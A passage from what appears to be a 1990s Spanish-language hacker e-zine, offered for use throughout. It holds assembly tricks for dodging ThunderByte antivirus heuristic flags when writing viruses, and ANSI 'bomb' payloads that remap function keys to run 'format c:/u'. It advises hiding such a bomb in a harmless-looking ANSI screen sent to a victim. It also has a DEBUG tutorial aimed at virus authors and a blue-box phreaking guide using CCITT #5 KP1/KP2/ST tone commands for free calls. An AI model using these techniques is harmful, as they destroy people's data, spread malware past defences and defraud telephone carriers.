	Virus:		<Virus>

   El remplazo de los JUMPs por equivalentes de PUSH y RET es ineficaz,
   incluso haciendolo con PUSH immediate. Lo mismo el remplazo de los JMPs
   planos y sencillos por JMPs mas elaborados, por ejemplo, con variables,
   etc. Esto se soluciona reemplazando la orden JMP por una manipulacion de la
   orden CALL. Se usa la orden call, y luego se deshecha el offset que queda
   en la stack, haciendo que quede todo como si fuera un JMP. Por ejemplo:

	Start:		CALL Continuar
			...
	Continuar:	ADD SP, 2
			CALL Virus
			...
	Virus:		ADD SP, 2
			<Virus>

Flag "K" - Unusual stack
------------------------
   Este aparece en la infeccion de EXE's. El problema de este flag es que salta
   cuando alguna de estas 2 condiciones aparece.. 

   1) Que el Stack Segment (SS) y el Code Segment (CS) apuntan al mismo
      segmento. Cosa de lo mas normal, porque lo t¡pico es poner al SS unos by_
      tes despues del virus, compartiendo el mismo segmento que el CS del
      virus, (el mismo CS que aparece en el header y el del programa en defini_
      tiva)..

   2) Que el Stack Pointer (SP) sea impar (odd stack).. esto es debido al di_
      se¤o del micro, el cual no esta preparado para situaciones de, por ejem_
      lo, un desbordamiento de segmento con un SP impar.. en este caso se col_
      gar¡a la m quina.. Esta bien, se puede usar un SP impar, pero no es lo
      aconsejable.. no se va a colgar por eso, pero tengan en cuenta las posi_
      bilidades.. Pero si al TB no le gusta, NO LO HACEMOS Y PUNTO, OK?!? :)

   Bueno, el primero es facil de cagar.. lo unico que hay que hacer es, cuando
   calculamos el nuevo CS:IP del programa (apuntando al virus), incrementamos
   ese CS que tenemos ahi y lo ponemos como nuevo SS:

	;Ahora tendriamos que pasar el CS incrementado a la variable del
	;header en el campo que corresponda...:
	; Initial Stack Segment: offset 0eh del header
	; Initial Stack Pointer: offset 10h del header
	INC AX				;<--- En AX por ejemplo tenemos el
					; CS calculado, y luego del INC, pasa
					; a ser el nuevo SS.
	MOV WORD PTR DS:[HEADER+0eh], AX; O lo que mierda sea en sus casos para
					; pasar el dato al nuevo header.

   Ahora bien, lo que nos queda es el SP que tiene que quedar par.. Bueno,
   que les puedo decir ? :) Como el stack lo ponen donde UDS. quieren, lo cal_
   culan par al terminar el virus y listo...
   El virus tiene una longitud constante, y como la longitud de separaci¢n
   entre el fin del virus y el stack, lo ponemos nosotros, la calculamos para
   que la suma de los 2, sea par y listo..

Flag "D" - Disk write access
----------------------------
   Los rumores cuentan que este flag hace su aparicion en los accesos de escri_
   tura directa al disco , se evita camufleando la llamada a la interupcion. 
  
Flag "R" - Relocator
--------------------
   Para eludir este flag se debe camuflear los registros por medio de operacio_
   nes del tipo phush y pop o algo asi. Si les aparece este flag matensen.....
   (su virus es una shit (-mierda-).
 Una buena aplicaci¢n de los c¢digos ANSI...Bombas!...
-------------------------------------------------------------------------------

	Bueno, por si no lo sab¡an, el ANSI es un controlador que posee varias
funciones de manejo de pantalla y teclado. Esto £ltimo es lo que nos interesa a
nosotros. [Si no tienen el ANSI.SYS, por favor llamen a Microsoft y compren el
MS_DOS (original por supuesto :-)]...Si consiguieron el controlador, empezamos:
La gran ventaja de ‚ste driver, es la funci¢n de redireccionamiento del tecla_
do. Qu‚ significa esto?? Bueno, esto significa, que ‚ste driver, programado de
una manera tal, puede CAMBIAR LA FUNCION de una tecla espec¡fica. Got it?
	A lo que voy es, que una vez que se carg¢ un ANSI, puedo redefinir las
las teclas de ese sistema.. Por ejemplo : en vez de escribir "DIR C:\WORKS",
podr¡a tocar la tecla "A" directamente. La l¢gica ser¡a ‚sta:

	A <== DIR C:\WORKS <ENTER>

Entonces cada vez que toque la "A", me va a aperecer el contenido de ese dir.
Esta propiedad, se podr¡a utilizar en otro tipo de aplicaciones :-) Por ese mo_
tivo, las "bombas" ANSI son de gran utilidad... Si nosotros logramos incorporar
una de estas bombas en un sistema, podemos tener el control del sistema, para
futuras necesidades.
	Un ejemplo: Tengo un mal d¡a.....todo me sale mal.....y biene un ‚nte
computacional a joder las pelotas. Entonces yo, ya ducho en el tema de las bom_
bas ANSI, le programo una bombita r pida, cosa que apenas la corra, le redirec_
cione la barra espaciadora para que le format‚e el disco. Este tipo no te puede
echar la culpa, ya que lo £nico que le diste fue una linda pantalla de presen_
taci¢n .ANS, pero siempre corremos el riego de que esta persona conozca el tema
de las bombas ANSI y te cague....entonces nos jodemos.

Ac  biene la sint xis de los c¢digos ANSI:

Ojo, no hay que asustarse por los c¢digos raros que aparezcan, la sint xis de
los c¢digos es as¡ y punto.

ESC[x,yH		
   Mover el cursor a una posicion absoluta de la pantalla.
   Donde 'x' es la Columna del cursor y 'y' es la Fila de cursor.
   En caso de que no se expliciten par metros, el cursor es movido al principio
   de la pantalla.

ESC[nA
   Mover el cursor en forma relativa para arriba.
   Donde 'n' es la cantidad de lineas que el cursor va a subir.
   En caso de que se llegue al tope de la pantalla, el cursor queda ah¡ quieto.

ESC[nB
   Mover el cursor en forma relativa para abajo.
   Donde 'n' es la cantidad de lineas que el cursor va a bajar.
   En caso de que se llegue al fondo de la pantalla, el cursor queda ah¡ duro.

ESC[nC
   Mover el cursor en forma relativa para la derecha.
   Donde 'n' es la cantidad de columnas que el cursor se va a adelantar.
   En caso de que llegue al fin de la linea, se queda ah¡.

ESC[nD
   Mover el cursor en forma relativa para la izquierda.
   Donde 'n' es la cantidad de columnas que el cursor va a retroceder.
   En caso de que llegue al principio de la pantalla, se queda ah¡.

ESC[s
   Salvar la posicion actual del cursor.
   Esta funci¢n no lleva par metros. Al ejecutarse, la posici¢n del cursor que_
   da grabada, para ser restitu¡da mas tarde con la pr¢x. funci¢n:

ESC[u
   Restaurar la posicion anterior del cursor.
   Esta funci¢n tampoco lleva par metros. Lo que hace es mover el cursor a don_
   de estaba en el momento de ejecutarse la funci¢n anterior.

ESC[2J
   Borrar la pantalla.
   Ning£n par metro... Al ejecutarse borra la pantalla y mueve el cursor al
   principio de la pantalla. (0,0)

ESC[K
   Borrar hacia abajo.
   Otra vez sin par metros... Al ejecutarse borra desde la posici¢n actual del
   cursor, hasta el fin de la pantalla. (Borra tambi‚n el byte a donde apuntaba
   el cursor)

ESC[tecla;"comando";13p
   Redireccionamiento del teclado.
   Ahora bien, ESTA es la funci¢n que nos interesa...
   En TECLA, va el c¢digo de la tecla que queremos redireccionar... Va el c¢di_
   go, NO la tecla en s¡, ok?? Cada tecla tiene un c¢digo, y cada combinaci¢n
   (por ejemplo ALT_Q) tiene otro distinto. Ahora les mandamos una lista con
   los c¢digos de TODAS las combinaci¢nes. (Si se nos olvid¢ alguna, pl¡s ha_
   gannoslo saber).
   Separada de la TECLA por un ; (punto y coma), empieza el string con el que
   queremos reemplazar la tecla...Este string o comando va entre comillas dob_
   les o simples ('' ¢ ""), es lo mismo.
   Ese 13 que est  entre "COMANDO"; y p (min£scula) es el c¢digo de ENTER, ya
   que el Enter no lo podemos representar con ASCIIs.
   Y esa p min£scula, es la funci¢n.
   Por ejemplo si queremos asignarle a F1 (c¢digo 0;59) que pida un directorio,
   quedar¡a esto:

	   ESC[0;59;"dir";13p
   Y si queremos que format‚e el disco, quedar¡a esto:

	   ESC[0;59;"Echo S|format c:/u";13p
   (El ECHO S|, es para la confirmaci¢n del format, en Castellano obvio. Si
   fuera en Ingl‚s, seria ECHO Y|.)
   Para poder juntar 2 comandos se esriben directamente, sin dejar espacio, Ej:
   Con esto estar¡a redireccionando F1 y F2 para que formateen 2 drives:

 ESC[0;59;"Echo S|format c:/u >nul";13pESC[0;60;"Echo S|format d:/u >nul";13p

Tecla                         C¢digo CAPS&+c¢digo CTRL+c¢digo   ALT+c¢digo 
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ 
F1                            0;59      0;84         0;94         0;104 
F2                            0;60      0;85         0;95         0;105 
F3                            0;61      0;86         0;96         0;106 
F4                            0;62      0;87         0;97         0;107 
F5                            0;63      0;88         0;98         0;108 
F6                            0;64      0;89         0;99         0;109 
F7                            0;65      0;90         0;100        0;110 
F8                            0;66      0;91         0;101        0;111 
F9                            0;67      0;92         0;102        0;112 
F10                           0;68      0;93         0;103        0;113 
F11                           0;133     0;135        0;137        0;139 
F12                           0;134     0;136        0;138        0;140 
Home        (Numeric Keypad)  0;71      55           0;119        ÄÄ 
Up Arrow    (Numeric Keypad)  0;72      56           (0;141)      ÄÄ 
Page Up     (Numeric Keypad)  0;73      57           0;132        ÄÄ 
Left Arrow  (Numeric Keypad)  0;75      52           0;115        ÄÄ 
Right Arrow (Numeric Keypad)  0;77      54           0;116        ÄÄ 
End         (Numeric Keypad)  0;79      49           0;117        ÄÄ 
Down Arrow  (Numeric Keypad)  0;80      50           (0;145)      ÄÄ 
Page Down   (Numeric Keypad)  0;81      51           0;118        ÄÄ 
Insert      (Numeric Keypad)  0;82      48           (0;146)      ÄÄ 
Del         (Numeric Keypad)  0;83      46           (0;147)      ÄÄ 
Home        (Gray Keypad)     (224;71)  (224;71)     (224;119)    (224;151) 
Up Arrow    (Gray Keypad)     (224;72)  (224;72)     (224;141)    (224;152) 
Page Up     (Gray Keypad)     (224;73)  (224;73)     (224;132)    (224;153) 
Left Arrow  (Gray Keypad)     (224;75)  (224;75)     (224;115)    (224;155) 
Right Arrow (Gray Keypad)     (224;77)  (224;77)     (224;116)    (224;157) 
End         (Gray Keypad)     (224;79)  (224;79)     (224;117)    (224;159) 
Down Arrow  (Gray Keypad)     (224;80)  (224;80)     (224;145)    (224;154) 
Page Down   (Gray Keypad)     (224;81)  (224;81)     (224;118)    (224;161) 
Insert      (Gray Keypad)     (224;82)  (224;82)     (224;146)    (224;162) 
Del         (Gray Keypad)     (224;83)  (224;83)     (224;147)    (224;163) 
Print Scrn                    ÄÄ        ÄÄ           0;114        ÄÄ 
Pause/Break                   ÄÄ        ÄÄ           0;0          ÄÄ 
BackSpace                     8         8            127          (0) 
Enter                         13        ÄÄ-          10           (0 
Tab                           9         0;15         (0;148)      (0;165) 
Nul                           0;3       ÄÄ           ÄÄ           ÄÄ 
a                             97        65           1            0;30 
b                             98        66           2            0;48 
c                             99        66           3            0;46 
d                             100       68           4            0;32 
e                             101       69           5            0;18 
f                             102       70           6            0;33 
g                             103       71           7            0;34 
h                             104       72           8            0;35 
i                             105       73           9            0;23 
j                             106       74           10           0;36 
k                             107       75           11           0;37 
l                             108       76           12           0;38 
m                             109       77           13           0;50 
n                             110       78           14           0;49 
o                             111       79           15           0;24 
p                             112       80           16           0;25 
q                             113       81           17           0;16 
r                             114       82           18           0;19 
s                             115       83           19           0;31 
t                             116       84           20           0;20 
u                             117       85           21           0;22 
v                             118       86           22           0;47 
w                             119       87           23           0;17 
x                             120       88           24           0;45 
y                             121       89           25           0;21 
z                             122       90           26           0;44 
1                             49        33           ÄÄ-          0;120 
2                             50        64           0            0;121 
3                             51        35           ÄÄ-          0;122 
4                             52        36           ÄÄ-          0;123 
5                             53        37           ÄÄ-          0;124 
6                             54        94           30           0;125 
7                             55        38           ÄÄ-          0;126 
8                             56        42           ÄÄ-          0;126 
9                             57        40           ÄÄ-          0;127 
0                             48        41           ÄÄ-          0;129 
-                             45        95           31           0;130 
=                             61        43           ÄÄ-          0;131 
[                             91        123          27           0;26 
]                             93        125          29           0;27 
                              92        124          28           0;43 
;                             59        58           ÄÄ-          0;39 
'                             39        34           ÄÄ-          0;40 
,                             44        60           ÄÄ-          0;51 
.                             46        62           ÄÄ-          0;52 
/                             47        63           ÄÄ-          0;53 
`                             96        126          ÄÄ-          (0;41) 
Enter (Numeric Keypad)        13        ÄÄ-          10           (0;166) 
/     (Numeric Keypad)        47        47           (0;142)      (0;74) 
*     (Numeric Keypad)        42        (0;144)      (0;78)       ÄÄ- 
-     (Numeric Keypad)        45        45           (0;149)      (0;164) 
+     (Numeric Keypad)        43        43           (0;150)      (0;55) 
5     (Numeric Keypad)        (0;76)    53           (0;143)      ÄÄ- 

Aclaraci¢nes:
^^^^^^^^^^^^^
	Si alguien ya conoce los c¢digos ANSI, sabr  que hay mas funciones, pe_
ro no vienen al caso. En t¢dos los c¢digos puse ESC.. Relamente no es ESC, sino
que su ASCII. Su ASCII es el 27 decimal (1b hexa), el s¡mbolo es la flecha a_
puntando a la izquierda. Para que un .ANS tome efecto, hay que TYPEarlo.
	Un consejo....no manden la bomba 'pelada', sino va a ser MUY obvio...
M ndenla en alguna pantalla ANSI ya hecha (preferiblemente al final, por si
por una de esas casualidades, ese ANSI ya redirecciona esa tecla).

   Esto es todo por hoy.
   Hasta el pr¢ximo cap¡tulo..... Drako.
Curso de Debug...
-------------------------------------------------------------------------------

	"El DEBUG es una porqueria" diran muchos de ustedes. Y tienen razon,
pues como debugger es un pornoco al lado de otros como el Turbo Debugger o
el ya mucho mas avanzado TD386. Pero el tema es que el DEBUG no es "solo" un
debugger, sino toda una herramienta para la persona que quiere saber y
experimentar en bajo nivel (y en virus). Permite hacer algunas cosas que los
otros no permiten, y ademas da mayor libertad al programa que esta siendo
debugeado. El debug no ha mejorado en nada a traves de las versiones de DOS
(excepto en size), los DEBUG de DOS 3.3, 5.0 y 6.0 eran siempre igual. Pero
la mejor prueba de que es una maSa es que nosotros seguimos pasandonos virus a 
traves de el (via scripts de debug)! Bueh, suficiente introduccion...

 LISTA DE COMANDOS:
 ------------------

 - A : Assemble [address]
	Para ensamblar. La direccion por default en que se empieza es el
	CS:IP inicial.
 - C : Compare [address1] [address2] [range]
	Compara los dos sectores de memoria dentro del rango, y devuelve las
	diferencias. Si no devuelve nada son iguales. Ejemplos:
	-C 100 200 100
	-C 100 600 50
	05DE:0100  B8  F7  05DE:0600
	05DE:0101  00  90  05DE:0601
 - D : Dump [start address] [end address]
	Dumpea (vuelca) memoria a pantalla, a partir del address dado o del
	default, si no se da ningun address. Si no se pone un end address,
	este comando vuelca 80H bytes. Ejemplos:
	-d 100 10F
	05DE:0100 B8 02 00 BA 07 00 CD 21 - B8 00 4C CD 21 90 90 90
	-d
	05DE:0110 90 90 90 90 90 90 90 90 - 90 90 90 90 90 90 90 90
	05DE:0120 90 90 90 90 90 90 90 90 - 90 90 90 90 90 90 90 90
	...
	05DE:0190 90 90 90 90 90 90 90 90 - 90 90 90 90 90 90 90 90
	-d 100 110
	05DE:0100 B8 02 00 BA 07 00 CD 21 - B8 00 4C CD 21 90 90 90
	05DE:0110 90
 - E : Enter [address] [lista]
	Entrar bytes a memoria, a partir del address. Si no se da la lista,
	el DEBUG la pregunta en un prompt. La lista se puede dar en Hex o
	directamente. Dentro de este prompt, '-' va al byte anterior,
	espacio va al siguiente, y enter sale. Ejemplos:
	-e 100 "baba"
	-e 100 b4 4c cd 21
	-e 100
	05DE:0100 B4.00 4C.00 CD.00 21.00-
	05DE:0102 00.FF-
	05DE:0101 00.FF
 - F : Fill [start address] [end address] [string]
	Llenar 80H bytes a partir del address con la string. Si no se da
	end address, se llenan 80H bytes. Ejemplo:
	-f 100 "PIPI"
	-f 100 1000 "TETRACLORURO DE MOLIBDENO"
 - G : Go To [=address] [puntos de ruptura]
	Breakpoint. G=Address produce que se comienze a ejecutar a partir
	de ese address. Luego se da una lista de los offsets en donde poner
	los breakpoints. Pueden ser tantos como se quiera. Ejemplo:
	-g=100 109 205
 - H : Hexadecimal [value1] [value2]
	Aritmetica Hexadecimal. Dados dos valores en Hexa, muestra su suma
	y su resta, tambien en hexa. Ejemplos:
	-h 102 100
	0202 0002
 - I : Input [port]
	Similar a la instruccion assembler IN. El byte entrado es mostrado
	a pantalla. Ejemplos:
	-I 70
	FF
 - L : Load [address] [drive] [first sector] [number]
	Similar a INT 25. Ejemplos:
	-L 200 0 0 1
 - M : Move [range] [address]
	Mueve memoria. Ejemplos:
	-m 100 200 1
 - N : Name [path\name]
	Redefine el nombre del archivo actual, y la lista de argumentos en el
	PSP. Ejemplos:
	-N VIRUS.COM
 - O : Output [port] [byte]
	Similar a la instruccion assembler OUT. Ejemplos:
	-O 70 1
 - P : Proceed [=direcci¢n] [n£mero]
	Proceder a traves del codigo. Si se da 'p=??' se comenzara desde esa
	direccion. 'numero' es el numero de instrucciones a seguir. (si no
	se da, es 1). Notar que con 'P' uno no debuggea INTs o CALLs por
	adentro. (Esa es la diferencia con 'T').
 - Q : Quit
	Sencillamente sale. Todos los cambios hechos en memoria se pierden.
 - R : Register [registro]
	Poniendo 'R' solo muestra el estado actual de los registros, mas la
	orden a la que apunta CS:IP (la proxima orden a ejecutarse). Poniendo
	r[nombre de registro] muestra el valor del registro particular y
	permite que uno cambie este valor.
	No solo se puede entrar AX,BX,CX,DX,SP,BP,SI,DI,DS,ES,CS,SS sino
	ademas IP (RIP), y el registro de las flags (RF)
	Ejemplos:
	-R
	AX=1020 BX=0000 CX=0000 DX=0000 SP=FFEE BP=0000 SI=0000 DI=0000
	DS=31DC ES=31DC SS=31DC CS=31DC IP=0100 NV UP EI PL NZ NA PO NC
	05DE:0100 01060002      ADD [200], AX		   DS:0200=0100
	-RAX
	AX 1020
	:FFFF
	-RIP
	IP 100
	:500
	-RF
	NV UP EI PL NZ NA PO NC - ZR
	-R
	AX=FFFF BX=0000 CX=0000 DX=0000 SP=FFEE BP=0000 SI=0000 DI=0000
	DS=31DC ES=31DC SS=31DC CS=31DC IP=0100 NV UP EI PL ZR NA PO NC
	05DE:0500 B80001        MOV AX, 0100
 - S : Search [start address] [end address] [list .... ]
	Busca entre las dos direcciones la cadena de valores. Debe ser dentro
	del mismo segmento. La cadena puede ser dada en valores Hex o puesta
	directamente. Devuelve las direcciones en que se encontro la cadena
	de bytes. Ejemplos:
	-s ds:100 200 "Ja Je Ji Jo Ju"
	05DE:0190
	-s cs:100 1000 e8 00 00
	05DE:0203
	05DE:0504
 - T : Trace [=address] [value]
	Seguir (paso a paso) la ejecucion del programa. Si se pone T=address,
	el seguimiento comenzara a partir de esa direccion. Si se da un numero
	luego de t, se seguira ese numero de instrucciones. Notar que usando
	't' uno puede debuggear internamente todos los procs (CALLs) y las
	interrupciones.
	-t 2
	(sanata)
	-t=500
	(mas sanata)
 - U : Unassemble [start address] [end address]
	Desensambla a pantalla el codigo en [rango]. El default address en
	que se empieza a desensamblar es CS:IP. Si no se da un address en el
	que parar, DEBUG desensambla de a 20H bytes. El "puntero" se actualiza
	cada vez que se pone este comando, por lo que poniendo dos "u" se
	desensamblan 40H bytes.
	Ejemplo:
	-u 100 110
 - W : Write ds:[address] [drive] [first sector] [number]
	Poniendo 'W' solamente escribe el estado actual de memoria al file
	definido via 'N', usando como size lo contenido en BX.CX. Usando los
	argumentos, es similar a INT 26. Ejemplos:
	-N TEST.COM
	-RCX
	CX 0000
	:100
	-W
	Writing 00100 bytes
	-W 100 0 0 1

Ordenes de EMS:
 - XA : Allocate expanded memory [#pages]
	Reserva memoria expandida. Se debe dar el numero de paginas, y
	devuelve el handler obtenido a pantalla. (Similar a INT 67/AH=43).
	Ejemplo:
	-XA 1
	Handler created = 0001
 - XD : Deallocate Expanded Memory [handler]
	Libera memoria expandida. Se debe dar el handler. (Similar a
	INT 67/AH=45) Ejemplo:
	-XA 1
	Handler created = 0001
	-XD 1
	Handler 0001 deallocated
 - XM : Map Expanded Memory Pages [logical page] [phisical page] [handler]
	Mapear pagina de EMS. (Similar a INT 67/AH=44). Ejemplo:
	-XM 0 0 1
 - XS : Get Expanded Memory State
	Muestra el estado actual de la memoria expandida en pantalla.

	Espero que hayan entendido todo, si no fijense, experimenten un poco. 
El DEBUG puede llegar a ser muy util si se lo sabe usar.
	Por ejemplo: necesitan un .COM para ver si su virus infecta. Van a
molestarse en hacer un .ASM y ensamblarlo? No! Entran al debug, ponen 'a' y
luego "mov ax, 4c00/int 21", luego "rcx/5", y luego 'w'. (Nota: obviamente el
virus no infecta EXE. Sino infectaria el DEBUG. Yo en esos casos copio el
DEBUG.EXE al directorio actual, lo uso y despues lo borro. Uno nunca sabe
adonde puede meterse un bug, y no me cabe terminar con un DEBUG trasheado, o
infectado por mi propio virus :-))
	O sino, estan experimentando con virus de BOOT y quieren ver si
infecto el drive A:. Van a entrar al Disk Editor para esta boludez, y bancarse
que scanee todos los directorios de C:? Jamas! Entrar a DEBUG y hacer un
programa que lea el boot via INT 25? Para que tomarse ese trabajo, si basta
con poner 'L 100 0 0 1'!
	O una tipica: estan haciendo un virus residente, pero el muy marica no 
infecta. Examinan durante sufridas horas el codigo .ASM, pero no encuentran 
nada. Sencillamente no pueden descubrir en que parte de la rutina de la 4B00 
esta el error. Que hacer? Cargar el virus en memoria y debuggear la rutina 
residente del virus con DEBUG! (Esta es una de las cosas que no se puede hacer 
con Turbo Debugger).
	O la ultima: quieren estudiar un virus, pero este utiliza tecnicas
anti-dissasembly. El sourcer (o el que tengan) se queda pagando como un imbecil
cuando trata de desensamblarlo. Que hacer? Desensamblar con DEBUG! Obviamente
no va a quedar con la misma "terminacion" pero eso se puede arreglar con un
poquito de laburo.
	Bueno, basta de ejemplos, ya ven porque DEBUG es un lindo
programita y porque nos sirve a los autores de virus :-). Que lo disfruten!
								    TrurlPhreaking desde Cero
-------------------------------------------------------------------------------

 Primero que nada queremos aclarar que este art¡culo esta dedicado a los que
 recien empizan o quieren empezar con el Phreaking, por eso es que no se pro-
 fundiza totalmente en la parte t‚cnica.

 Bueno primero que nada queremos aclarar que es el PHREAKING.
 PHREAK es la deformaci¢n de la palabra FREE.
 PHREAKING: Es la utilizaci¢n de las l¡neas telef¢nicas para llamadas de uso
 propios, sin pagar por los mismos.

 Esta actividad es muy com£n en otros paises. Aca comenz¢ a ser popular
 hace poco tiempo, actualmente tenemos algunas ventajas:

 þ Mejor y mas avanzada tecnolog¡a con la privatizaci¢n de ENTEL.
 þ Poca seguridad en sistemas telef¢nicos.

 Formas de Phreaking:

 Una forma com£n de phreaking seria llamar a una empresa que tenga instalada
 una central telef¢nica, la cual se pueda controlar en forma remota enviando
 un c¢digo de acceso (a travez de tonos) podemos controlarla y por ejemplo
 redireccionar la llamada a un interno, pero tambien se podria escuchar
 los mensajes de ese interno, etc.
 Lo mas interesante de esto es que podriamos redireccionar nuestra llamada ha-
 cia otra l¡nea de la empresa, y asi relizar llamadas con esto por ejemplo si
 discamos un n£mero INTERNACIONAL solo abonariamos la llamada LOCAL.
 Con esto igualmente estariamos pagando por la llamada LOCAL a la empresa, por
 lo cual no nos sirve para llamados LOCALES, y para INTERNACIONALES estariamos
 pagando algo.
 Si miramos un poco la TV vamos a ver esas odiosas propagandas de las AFJP que
 tanto se promocionan con n£meros 0-800, de cobro revertido (gratis para noso-
 tros). Tambi‚n unas cuantas empresas mas tienen estos n£meros (incluyendo a
 TELEFONICA). Qu‚ pasaria si logramos controlar alguna central?. Podriamos
 hacer llamadas LOCALES e INTERNACIONALES totalmente GRATIS.

 Por supuesto que esta es solo una de todas las formas de PHREAKING que existe.
 Otra forma es la que actualmente se hizo muy POPULAR por ac  y se descubri¢
 hace muchos a¤os: EL BLUEBOX.
 No vamos a entrar en detalles de quien empez¢ con esto ni cuando ni donde solo
 vamos a explicar como funciona.
 Cuando nosotros llamamos a alg£n n£mero de tel‚fono lo que sucede es lo
 siguiente:

 Marcamos el n£mero destino (DN) en nuestra central (SWITCH), si este n£mero
 corresponde a ese mismo SWITCH reliza todo el proceso de comunicaci¢n sin que
 el llamado salga del mismo.
 Si el n£mero no corresponde al SWITCH, este envia un comando hacia otro SWITCH
 a travez de los canales de comunicaciones que hay entre centrales para comen-
 zar la comunicaci¢n.

 Veamos un ejemplo:

 Nosotros, con el n£mero 981-1234 llamamos a alguien con el n£mero 312-1000
 obviamente estos correspondes a distintos SWITCHES, entonces al marcar el
 n£mero 312-1000 nuestro SWITCH (981) le envia al otro SWITCH (312) una serie
 de comandos que realizan la llamada, cuando nosotros cortamos la comunicaci¢n,
 nuestro SWITCH (981) le envia al otro (312) una(s) se¤al(es) (o TONOs) con el
 cual le informa al otro SWITCH que cortamos y que ese canal tiene que volver
 al modo normal (para recibir comandos).

 þ Qu‚ pasaria si nosotros en medio de una comunicaci¢n enviamos el mismo TONO
   que dijimos antes?

 Muy simple, la comunicaci¢n se corta, pero solo con el n£mero destino, no con
 el switch 312 la cual ya esta lista para recibir comandos, nosotros ah¡ le po-
 driamos enviar un comando para discar y lo haria, mientras nuestro switch (981)
 cree que estamos conectados al 312-1000 y nos factura eso.

 þ Y si hacemos esto con un n£mero 0-800, qu‚ pasaria?

 Nuestra central no nos cobrara nada ya que es de cobro revertido, ni tampoco
 le cobran al abonado de ese n£mero, debido que para su central cortamos. Una
 vez comunicados enviamos el TONO y los comandos para realizar una llamada, asi
 podriamos hacer llamadas LOCALES o INTERNACIONALES! totalmente GRATIS, ya que
 para nuestro SWITCH estamos conectados al 0-800.

 Ahora vamos a ver lo mas popular del BLUEBOX en nuetro pais.

 Si leemos un poco las primeras p ginas de nuestra gu¡a telef¢nica (si esas
 paginas que hasta hoy ni miramos) podemos observar que en la parte de comuni-
 caciones internacionales hay un articulo como el siguiente:

 ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
                   S E R V I C I O  P A I S  D I R E C T O
                         (Cobro revertido automatico)
 ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
 Desde cualquier tel‚fono que cuente con acceso al Discado Directo Internacio-
 nal, se pueden relaizar llamadas Internacionales de cobro revertido en forma
 directa. Discando los n£meros que se detallan mas abajo lo atender  una opera-
 dora en el pais destino que tramitar  la comunicaci¢n facturando el valor de
 la llamada al destinatario (previa aceptaci¢n de este).
 Hasta el presente se habilitaron los siguientes paises: EE.UU, Espa¤a, Italia,
 Brasil, Chile y Francia.

                 ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÜ
                 ³Los c¢digos de acceso son:              Û
                 ³USA-ATT:              00-1-800-200-1111 Û
                 ³USA-MCI:              00-1-800-333-1111 Û
                 ³USA-SPRINT:           00-1-800-777-1111 Û
                 ³ESPA¥A:               00-34-800-444-111 Û
                 ³ITALIA:               00-39-800-555-111 Û
                 ³BRASIL:               00-55-800-666-111 Û
                 ³CHILE:                00-56-800-888-111 Û
                 ³FRANCIA:              00-33-800-999-111 Û
                 ÀÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÛ
 ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

 Bueno, una breve explicaci¢n. Estos n£meros son totalmente gratis (?), se de-
 berian utilizar asi (Ejemplo de Chile):

 OPER> ENTEL Chile.
  NOS> Buen d¡a, necesito hablar con el n£mero XXX-XXXX en Valparaiso.
 OPER> Un momento por favor enseguida le comunico.

 La operadora llama al n£mero y pregunta si aceptan nuestra llamada de cobro
 revertido y si es asi nos comunica con ese n£mero.

 Pero que pasa, estos SWITCHES (el de ENTEL Chile y el de TELEINTAR) utilizan
 la norma CCITT #5, que establecen un est ndar en la se¤alizaci¢n de la comu-
 nicaci¢n entre los dos SWITCHES, y cuando nosotros cortamos, TELEINTAR le
 envia un TONO a al SWITCH de ENTEL Chile. En este caso tambien podriamos en-
 viar ese tono y sucederia lo mismo que comentamos antes, la central nos con-
 testa con un tono, porque cree que cortamos y la comunicaci¢n en ese canal
 solo sigue con TELEINTAR, con esto podemos enviarle comandos al SWITCH.

 Algunos de los comandos son: KP1 KP2 ST C11 C12

 Los comandos de mayor utilidad para nosotros son KP1 y KP2 con los cuales
 podemos hacer llamadas LOCALES (KP1) o INTERNACIONALES (KP2),el formato seria:

 KP1 (XXX)XXX-XXXX ST
 ÀÄ´  ÀÂÙ ÀÄÄÂÄÄÄÙ À´
   ³   ³     ³      ³
   ³   ³     ³      ÀÄÄÄÄÄÄ START TONE, terminamos el comando
   ³   ³     ÀÄÄÄÄÄÄÄÄÄÄÄÄÄ DN, N£mero donde llamamos
   ³   ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ Area Code, C¢digo de area donde llamamos
   ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ KEY PULSE, Comando para llamada Local


 Esto seria para una llamada dentro del pais, para una llamada internacional,
 deberiamos enviar el comando de la siguiente manera:

 KP2 XX 0 (XXX)XXX-XXXX ST
 ÀÂÙ À´ ³  ÀÂÙ ÀÂÄÄÄÄÄÙ À´
  ³   ³ ³   ³   ³        ³
  ³   ³ ³   ³   ³        ÀÄ START TONE - termina el comando.
  ³   ³ ³   ³   ÀÄÄÄÄÄÄÄÄÄÄ DN - Destination Number. N£mero a donde llamamos
  ³   ³ ³   ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄ Area Code, C¢digo del area donde llamamos
  ³   ³ ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ Siempre 0 (separa c¢digo de pa¡s de lo demas)
